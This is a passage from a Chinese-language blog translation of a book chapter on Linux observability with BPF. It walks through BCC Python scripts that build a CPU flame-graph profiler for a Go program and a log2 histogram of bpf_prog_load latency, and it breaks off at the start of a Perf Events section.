没有人喜欢理解冗长而复杂的日志。如果我们想监控延迟和CPU利用率的变化，通过查看一段时间内的图表比汇总文件流中的数字更容易。</p><p>本节探讨呈现BPF跟踪数据的不同方式。一方面，我们将展示BPF程序如何构建聚合信息。另一方面，你将学习如何以便携式表示形式导出该信息，并使用现成的工具访问更丰富的表示形式并与其他人分享。</p><h4 id="火焰图"><a href="#火焰图" class="headerlink" title="火焰图"></a>火焰图</h4><p>火焰图是帮助你可视化系统花费时间的图表。它们可以让你清楚地表示应用程序中的哪些代码执行得更频繁。火焰图的创建者<code>Brendan Gregg</code>维护了一组脚本，可以在GitHub上轻松生成这些可视化格式。我们使用这些脚本从本节后面使用BPF收集的数据生成火焰图。 </p><p>关于火焰图显示的内容，需要记住两件重要的事情：</p><ul><li>x轴按字母顺序排列。每个堆栈的宽度表示它在收集数据中出现的频率，这可以与启用探查器时访问该代码路径的频率相关。</li><li>y 轴显示在分析器读取堆栈跟踪时排序，保留跟踪层次结构。</li></ul><p>最著名的火焰图代表了系统中最频繁消耗CPU的代码；这些被称为CPU图。另一个有趣的火焰图可视化是CPU外图；它们代表CPU在与应用程序无关的其他任务上花费的时间。通过组合<code>on-CPU</code>和<code>off-CPU</code>图表，可以全面了解系统花费CPU周期的内容。</p><p>CPU内和CPU外图都使用堆栈跟踪来指示系统花费时间的位置。 一些编程语言，如Go，总是在其二进制文件中包含跟踪信息，但其他编程语言，如 C++ 和Java，需要一些额外的工作才能使堆栈跟踪可读。在你的应用程序包含堆栈跟踪信息后，BPF程序可以使用它来聚合内核看到的最常见的代码路径。</p><p>内核中的堆栈跟踪聚合有优点也有缺点。一方面，这是一种计算堆栈跟踪频率的有效方法，因为它发生在内核中，避免将每个堆栈信息发送到用户空间并减少内核和用户空间之间的数据交换。另一方面，非CPU图表要处理的事件数量可能会非常高，因为你正在跟踪应用程序上下文切换期间发生的每个事件。如果尝试对其进行分析太长时间，这可能会在系统中产生大量开销。 使用火焰图时请记住这一点。</p><p>BCC提供了几个实用程序来帮助聚合和可视化堆栈跟踪，主要的是宏<code>BPF_STACK_TRACE</code>。 这个宏生成一个<code>BPF_MAP_TYPE_STACK_TRACE</code>类型的BPF映射来存储BPF程序累积的堆栈。最重要的是，这个BPF映射得到了增强，增加了从程序上下文中提取堆栈信息的方法，并在聚合它们后在你想使用它们时遍历累积的堆栈跟踪。</p><p>在下一个示例中，我们构建了一个简单的BPF分析器，它打印从用户空间应用程序收集的堆栈跟踪。我们使用分析器收集的轨迹生成CPU上的火焰图。为了测试这个分析器，我们将编写一个生成CPU负载的最小Go程序。<code>main.go</code>程序代码如下所示</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">"time"</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; </span><br><span class="line">  j:=<span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> time.Since(time.Now()) &lt; time.Second &#123; </span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">1</span>;i&lt;<span class="number">1000000</span>;i++&#123;</span><br><span class="line">j*=i </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果将此代码保存在名为<code>main.go</code>的文件中并使用<code>go run main.go</code>运行它您会看到系统的CPU利用率显着增加。 你可以通过按键盘上的<code>Ctrl-C</code>来停止执行，CPU利用率将恢复正常。</p><p>我们BPF程序的第一部分将初始化分析器结构：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/bpf_perf_event.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;linux/sched.h&gt;</span></span><br><span class="line"><span class="string">struct trace_t &#123;1</span></span><br><span class="line"><span class="string">  int stack_id;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">BPF_HASH(cache, struct trace_t);2</span></span><br><span class="line"><span class="string">BPF_STACK_TRACE(traces, 10000);3</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>1：初始化一个结构，该结构将存储我们的分析器接收到的每个堆栈帧的引用标识符。 稍后我们使用这些标识符来找出当时正在执行的代码路径。</p><p>2：初始化一个BPF哈希映射，我们用它来聚合我们看到相同strack帧的频率。 火焰图脚本使用此聚合值来确定执行相同代码的频率。</p><p>3：初始化我们的BPF堆栈跟踪映射。 我们为此地图设置了最大尺寸，但它可能会根据要处理的数据量而有所不同。将这个值作为变量会更好，但我们知道写的Go应用程序不是很大，所以10000个元素就足够了。</p><p>接下来，我们在分析器中实现聚合堆栈跟踪的函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int collect_stack_traces(struct bpf_perf_event_data *ctx) &#123;</span></span><br><span class="line"><span class="string">  u32 pid = bpf_get_current_pid_tgid() &gt;&gt; 32;1</span></span><br><span class="line"><span class="string">  if (pid != PROGRAM_PID)</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  struct trace_t trace = &#123;2</span></span><br><span class="line"><span class="string">    .stack_id = traces.get_stackid(&amp;ctx-&gt;regs, BPF_F_USER_STACK)</span></span><br><span class="line"><span class="string">  &#125;;</span></span><br><span class="line"><span class="string">  cache.increment(trace);3</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>1：验证当前BPF上下文中程序的进程ID是不是我们的Go应用程序的进程ID；否则，我们将忽略该事件。我们目前还没有定义<code>PROGRAM_PID</code>的值。在初始化BPF程序之前，让我们在分析器的Python部分替换这个字符串。这是BCC初始化BPF程序方式的当前限制；我们不能从用户空间传递任何变量，并且作为一种常见的做法，这些字符串在初始化之前在代码中被替换。</p><p>2：创建跟踪以汇总其使用情况。我们使用内置函数<code>get_stackid</code>从程序上下文中获取堆栈ID。 这是BCC添加到我们的堆栈跟踪映射的辅助函数之一。我们使用标志<code>BPF_F_USER_STACK</code>来表示我们想要获取用户空间应用程序的堆栈ID，我们并不关心内核内部发生了什么。</p><p>3：增加跟踪的计数器以跟踪相同代码的执行频率。</p><p>接下来，我们要将堆栈跟踪收集器附加到内核中的所有<code>Perf</code>事件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">program_pid = int(sys.argv[<span class="number">1</span>])<span class="number">1</span></span><br><span class="line">bpf_source = bpf_source.replace(<span class="string">'PROGRAM_PID'</span>, str(program_pid))<span class="number">2</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)</span><br><span class="line">bpf.attach_perf_event(ev_type=PerfType.SOFTWARE,<span class="number">3</span></span><br><span class="line">                      ev_config=PerfSWConfig.CPU_CLOCK,</span><br><span class="line">                      fn_name=<span class="string">'collect_stack_traces'</span>,</span><br><span class="line">                      sample_period=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">exiting = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>1：Python程序的第一个参数是我们正在分析的Go应用程序的进程标识符。</p><p>2：使用Python的内置替换函数将BPF源中的字符串<code>PROGRAM_ID</code>与提供给分析器的参数交换。</p><p>3：将BPF程序附加到所有软件<code>Perf</code>事件，这将忽略任何其他事件，如硬件事件。我们还将BPF程序配置为使用CPU时钟作为时间源，这样我们就可以测量执行时间。</p><p>最后，我们需要实现在分析器中断时将堆栈跟踪转储到标准输出中的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sleep(<span class="number">300</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    exiting = <span class="number">1</span></span><br><span class="line">    signal.signal(signal.SIGINT, signal_ignore)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"dumping the results"</span>)</span><br><span class="line"><span class="keyword">for</span> trace, acc <span class="keyword">in</span> sorted(bpf[<span class="string">'cache'</span>].items(), key=<span class="keyword">lambda</span> cache: cache[<span class="number">1</span>].value):<span class="number">1</span></span><br><span class="line">    line = []</span><br><span class="line">    <span class="keyword">if</span> trace.stack_id &lt; <span class="number">0</span> <span class="keyword">and</span> trace.stack_id == -errno.EFAULT:<span class="number">2</span></span><br><span class="line">        line = [<span class="string">'Unknown stack'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        stack_trace = list(bpf[<span class="string">'traces'</span>].walk(trace.stack_id))</span><br><span class="line">        <span class="keyword">for</span> stack_address <span class="keyword">in</span> reversed(stack_trace):<span class="number">3</span></span><br><span class="line">            function_name = bpf.sym(stack_address, program_pid).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">            <span class="keyword">if</span> function_name == <span class="string">'[unknown]'</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            line.extend([function_name])<span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(line) &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    frame = <span class="string">";"</span>.join(line)<span class="number">5</span></span><br><span class="line">    sys.stdout.write(<span class="string">"%s %d\n"</span> % (frame, acc.value))</span><br><span class="line">    <span class="keyword">if</span> exiting:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>1：遍历我们收集的所有跟踪，以便我们可以按顺序打印它们。</p><p>2：验证我们是否获得了堆栈标识符，我们可以稍后将其与特定的代码行相关联。如果我们得到一个无效值，我们将在火焰图中使用一个占位符。</p><p>3：以相反的顺序遍历堆栈跟踪中的所有条目。我们这样做是希望在顶部看到最近执行的第一个代码路径，就像在任何堆栈跟踪中所期望的那样。</p><p>4：使用BCC帮助程序符号将堆栈帧的内存地址转换为我们源代码中的函数名称。</p><p>5：格式化以分号分隔的堆栈跟踪行。这是火焰图脚本希望能够生成我们的可视化的格式。</p><p>完整的<code>profiler.py</code>程序如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> errno</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF, PerfSWConfig, PerfType</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signal_ignore</span><span class="params">(signal, frame)</span>:</span></span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/bpf_perf_event.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;linux/sched.h&gt;</span></span><br><span class="line"><span class="string">struct trace_t &#123;</span></span><br><span class="line"><span class="string">  int stack_id;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">BPF_HASH(cache, struct trace_t);</span></span><br><span class="line"><span class="string">BPF_STACK_TRACE(traces, 10000);</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int collect_stack_traces(struct bpf_perf_event_data *ctx) &#123;</span></span><br><span class="line"><span class="string">  u32 pid = bpf_get_current_pid_tgid() &gt;&gt; 32;</span></span><br><span class="line"><span class="string">  if (pid != PROGRAM_PID)</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  struct trace_t trace = &#123;</span></span><br><span class="line"><span class="string">    .stack_id = traces.get_stackid(&amp;ctx-&gt;regs, BPF_F_USER_STACK)</span></span><br><span class="line"><span class="string">  &#125;;</span></span><br><span class="line"><span class="string">  cache.increment(trace);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">program_pid = int(sys.argv[<span class="number">1</span>])</span><br><span class="line">bpf_source = bpf_source.replace(<span class="string">'PROGRAM_PID'</span>, str(program_pid))</span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)</span><br><span class="line">bpf.attach_perf_event(ev_type=PerfType.SOFTWARE,</span><br><span class="line">                      ev_config=PerfSWConfig.CPU_CLOCK,</span><br><span class="line">                      fn_name=<span class="string">'collect_stack_traces'</span>,</span><br><span class="line">                      sample_period=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">exiting = <span class="number">0</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sleep(<span class="number">300</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    exiting = <span class="number">1</span></span><br><span class="line">    signal.signal(signal.SIGINT, signal_ignore)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"dumping the results"</span>)</span><br><span class="line"><span class="keyword">for</span> trace, acc <span class="keyword">in</span> sorted(bpf[<span class="string">'cache'</span>].items(), key=<span class="keyword">lambda</span> cache: cache[<span class="number">1</span>].value):</span><br><span class="line">    line = []</span><br><span class="line">    <span class="keyword">if</span> trace.stack_id &lt; <span class="number">0</span> <span class="keyword">and</span> trace.stack_id == -errno.EFAULT:</span><br><span class="line">        line = [<span class="string">'Unknown stack'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        stack_trace = list(bpf[<span class="string">'traces'</span>].walk(trace.stack_id))</span><br><span class="line">        <span class="keyword">for</span> stack_address <span class="keyword">in</span> reversed(stack_trace):</span><br><span class="line">            function_name = bpf.sym(stack_address, program_pid).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">            <span class="keyword">if</span> function_name == <span class="string">'[unknown]'</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            line.extend([function_name])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(line) &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    frame = <span class="string">";"</span>.join(line)</span><br><span class="line">    sys.stdout.write(<span class="string">"%s %d\n"</span> % (frame, acc.value))</span><br><span class="line">    <span class="keyword">if</span> exiting:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>随着我们的BPF分析器完成，我们可以将它运行以收集我们Go程序的堆栈跟踪。 我们需要将Go程序的进程ID传递给我们的分析器，以确保我们只收集此应用程序的跟踪；我们可以使用<code>pgrep</code>找到该PID。</p><p>首先我们需要将Go程序运行起来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos flamegraph]# go run main.go</span><br></pre></td></tr></table></figure><p>如果你将探测器保存在名为<code>profiler.py</code>的文件中，下面就是运行探测器的方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos flamegraph]# python3 profiler.py `pgrep -nx go` &gt; /tmp/profile.out</span><br></pre></td></tr></table></figure><p><code>pgrep</code>将在PID中搜索名称与go匹配的系统上运行的进程。我们将分析器的输出发送到一个临时文件，以便我们可以生成火焰图可视化。</p><p>正如我们之前提到的，我们将使用<code>Brendan Gregg</code>的`FlameGraph脚本为我们的图生成一个SVG文件； 你可以在<a href="!https://github.com/brendangregg/FlameGraph">GitHub</a>中找到这些脚本。 下载后可以使用 flamegraph.pl 生成图。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos FlameGraph]# ./flamegraph.pl /tmp/profile.out &gt; /tmp/flamegraph.svg</span><br></pre></td></tr></table></figure><p>使用浏览器打开图片如下</p><p><img src="/2022/05/27/使用BPF的Linux可观测性-上篇-翻译/1.png" alt="1"></p><p>这种探查器对于跟踪系统中的性能问题很有用。 BCC已经包含一个比我们示例中的更高级的分析器，可以直接在生产环境中使用。除了分析器之外，BCC还包括了帮助生成CPU外火焰图和许多其他可视化来分析系统的工具。</p><h4 id="直方图"><a href="#直方图" class="headerlink" title="直方图"></a>直方图</h4><p>直方图是显示多个值范围出现频率的图表。表示这一点的数字数据被分成桶，每个桶包含桶内任何数据点的出现次数。直方图测量的频率是每个桶的高度和宽度的组合。如果桶被分成相等的范围，这个频率匹配直方图的高度，但如果范围没有被平均划分，你需要将每个高度乘以每个宽度来找到正确的频率。</p><p>直方图是进行系统性能分析的基本组成部分。它们是表示可测量事件（如指令延迟）分布的绝佳工具，因为它们显示的信息比通过其他测量（如平均值）获得的更准确。</p><p>BPF程序可以基于许多指标创建直方图。你可以使用BPF图来收集信息，将其分类到桶中，然后为你的数据生成直方图表示。实现这个逻辑并不复杂，但是如果每次需要分析程序的输出时都想打印直方图就会变得乏味。BCC包含一个开箱即用的实现，可以在每个程序中重复使用，而无需每次手动计算分桶和频率。</p><p>作为一个有趣的实验，我们将展示如何使用BCC的直方图来可视化应用程序调用<code>bpf_prog_load</code>指令时加载BPF程序所引入的延迟。我们使用<code>kprobes</code>来收集该指令完成所需的时间，并将结果累积在一个直方图中，稍后我们将对其进行可视化。为了便于理解，我们将这个示例分成了几个部分。</p><p>第一部分包括了BPF程序的初始化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">BPF_HASH(cache, u64, u64);</span></span><br><span class="line"><span class="string">BPF_HISTOGRAM(histogram);</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load_start(void *ctx) &#123;1</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();2</span></span><br><span class="line"><span class="string">  u64 start_time_ns = bpf_ktime_get_ns();</span></span><br><span class="line"><span class="string">  cache.update(&amp;pid, &amp;start_time_ns);3</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>1：使用宏创建BPF哈希映射来存储触发<code>bpf_prog_load</code>指令的初始时间。</p><p>2：使用新的宏创建BPF直方图。这不是原生BPF映射；BCC包含此宏，以便让你更轻松地创建这些可视化。在底层，这个BPF直方图使用数组映射来存储信息。它还有几个助手来进行分桶并创建最终图。</p><p>3：当应用程序触发我们要跟踪的指令时，使用程序 PID 来存储。</p><p>让我们看看我们如何计算延迟的增量并将其存储在我们的直方图中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load_return(void *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 *start_time_ns, delta;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  start_time_ns = cache.lookup(&amp;pid);</span></span><br><span class="line"><span class="string">  if (start_time_ns == 0)</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  delta = bpf_ktime_get_ns() - *start_time_ns;1</span></span><br><span class="line"><span class="string">  histogram.increment(bpf_log2l(delta));2</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>1：计算指令被调用的时间和我们的程序到达这里的时间之间的增量； 我们可以假设这也是指令完成的时间。</p><p>2：将该增量存储在我们的直方图中。我们在这条线上做了两个操作。 首先，我们使用内置函数<code>bpf_log2l</code>为 <code>delta</code>的值生成桶标识符。此功能会随着时间的推移创建稳定的值分布。然后，我们使用增量函数向这个桶中添加一个新项目。默认情况下，如果直方图中存在<code>bucket</code>，则<code>increment</code>会将该值加1，否则会启动一个值为1的新bucket，因此无需担心该值是否存在。</p><p>我们需要编写的最后一段代码将这两个函数附加到有效的<code>kprobe</code>上，并在屏幕上打印直方图，以便我们可以看到延迟分布。这部分是我们初始化BPF程序并等待事件生成直方图的地方：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bpf = BPF(text=bpf_source)</span><br><span class="line">bpf.attach_kprobe(event=<span class="string">"bpf_prog_load"</span>, fn_name=<span class="string">"trace_bpf_prog_load_start"</span>)</span><br><span class="line">bpf.attach_kretprobe(event=<span class="string">"bpf_prog_load"</span>,</span><br><span class="line">                     fn_name=<span class="string">"trace_bpf_prog_load_return"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sleep(<span class="number">300</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    signal.signal(signal.SIGINT, signal_ignore)</span><br><span class="line"></span><br><span class="line">bpf[<span class="string">"histogram"</span>].print_log2_hist(<span class="string">"msecs"</span>)</span><br></pre></td></tr></table></figure><p>正如我们在本节开头提到的，直方图可用于观察系统中的异常情况。BCC工具包括许多使用直方图表示数据的脚本。需要深入了解系统时可以查看它们。</p><p><code>histogram.py</code>完整代码如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signal_ignore</span><span class="params">(signal, frame)</span>:</span></span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">BPF_HASH(cache, u64, u64);</span></span><br><span class="line"><span class="string">BPF_HISTOGRAM(histogram);</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load_start(void *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  u64 start_time_ns = bpf_ktime_get_ns();</span></span><br><span class="line"><span class="string">  cache.update(&amp;pid, &amp;start_time_ns);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load_return(void *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 *start_time_ns, delta;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  start_time_ns = cache.lookup(&amp;pid);</span></span><br><span class="line"><span class="string">  if (start_time_ns == 0)</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  delta = bpf_ktime_get_ns() - *start_time_ns;</span></span><br><span class="line"><span class="string">  histogram.increment(bpf_log2l(delta));</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)</span><br><span class="line">bpf.attach_kprobe(event=<span class="string">"bpf_prog_load"</span>, fn_name=<span class="string">"trace_bpf_prog_load_start"</span>)</span><br><span class="line">bpf.attach_kretprobe(event=<span class="string">"bpf_prog_load"</span>,</span><br><span class="line">                     fn_name=<span class="string">"trace_bpf_prog_load_return"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sleep(<span class="number">300</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    signal.signal(signal.SIGINT, signal_ignore)</span><br><span class="line"></span><br><span class="line">bpf[<span class="string">"histogram"</span>].print_log2_hist(<span class="string">"msecs"</span>)</span><br></pre></td></tr></table></figure><h4 id="Perf-Events"><a href="#Perf-Events" class="headerlink" title="Perf Events"></a>Perf Events</h4><p>我们相信<code>Perf</code>事件可能是成功使用BPF跟踪所需掌握的最重要的通信方法。我们在前一章中讨论了<code>BPF 